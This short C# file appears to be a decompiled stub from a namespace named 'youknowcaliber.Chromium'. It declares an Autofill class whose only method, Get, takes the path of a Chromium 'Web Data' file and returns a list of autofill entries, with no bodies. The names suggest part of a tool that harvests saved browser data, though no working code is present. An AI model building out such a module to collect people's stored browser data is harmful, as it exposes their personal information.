using System.Collections.Generic;

namespace youknowcaliber.Chromium;

internal sealed class Autofill
{
	public static extern List<AutoFill> Get(string sWebData);

	public extern Autofill();
}
